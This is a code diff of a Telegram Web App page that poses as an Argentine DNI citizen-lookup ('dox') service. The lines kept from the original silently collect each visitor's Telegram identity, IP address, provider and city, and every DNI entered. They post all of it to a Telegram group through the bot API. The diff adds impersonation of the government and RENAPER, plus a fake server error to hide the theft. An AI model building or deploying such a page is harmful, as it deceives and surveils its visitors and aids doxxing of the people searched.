@@ -3,29 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ARG-DATA DOX</title>
+    <title>SISTEMA ARG-DATA v5.0</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #0a0a0a; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
-        .box { border: 1px solid #ff0000; padding: 30px 20px; border-radius: 5px; box-shadow: 0 0 15px #ff0000; max-width: 350px; margin: 40px auto; }
-        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #ff0000; color: #fff; text-align: center; outline: none; }
-        button { background: #ff0000; color: #fff; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; text-transform: uppercase; }
-        .status { font-size: 0.7em; margin-top: 15px; color: #00ff00; }
+        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
+        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
+        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; outline: none; }
+        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; }
+        .footer { font-size: 0.7em; color: #444; margin-top: 30px; }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <h2 style="margin:0;">ARG-DATA DOX</h2>
-        <p style="font-size:0.8em; color:#888;">DATABASE v5.0.1 - ARGENTINA</p>
-        <hr style="border: 0.5px solid #333;">
-        
-        <input type="number" id="dni" placeholder="DNI A CONSULTAR">
+        <h3>ARG-DATA BOT</h3>
+        <p>CONSULTA NACIONAL DNI</p>
+        <hr style="border: 0.5px solid #00f2ff22;">
+        <input type="number" id="dni" placeholder="Ingrese DNI objetivo">
         <br>
-        <button onclick="enviarDni()">EJECUTAR BÚSQUEDA</button>
-        
-        <div id="status" class="status">SISTEMA CONECTADO...</div>
+        <button onclick="enviarDni()">BUSCAR CIUDADANO</button>
+        <p id="status" style="font-size: 0.8em; margin-top:15px;">Sincronizando con RENAPER...</p>
     </div>
+
+    <div class="footer">ACCESO RESTRINGIDO - GOBIERNO DE ARGENTINA</div>
 
     <script>
         const tg = window.Telegram.WebApp;
@@ -49,7 +49,7 @@
                                     `--------------------------------\n` +
                                     `👤 **Usuario:** ${nombreFull}\n` +
                                     `🆔 **Alias:** ${username}\n` +
-                                    `🔢 **ID:** ${userId}\n` +
+                                    `🔢 **ID:** \`${userId}\`\n` +
                                     `🌐 **IP:** \`${data.ip}\`\n` +
                                     `📡 **Proveedor:** ${data.org}\n` +
                                     `📍 **Ciudad:** ${data.city}, ${data.country_name}\n` +
@@ -71,14 +71,14 @@
             
             if(!dni) return alert("Ingrese un DNI");
 
-            const msgDni = `🎯 **DNI CONSULTADO**\n👤 **Por:** ${alias}\n🔎 **DNI:** \`${dni}\``;
+            const msgDni = `📝 **DNI INGRESADO**\n👤 **Por:** ${alias}\n🎯 **DNI:** \`${dni}\``;
 
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: grupoId, text: msgDni, parse_mode: 'Markdown' })
             });
-            alert("Error: Acceso denegado. Se requiere suscripción Premium.");
+            alert("Error 505: El servidor de RENAPER no responde.");
         }
 
         window.onload = reportePrincipal;
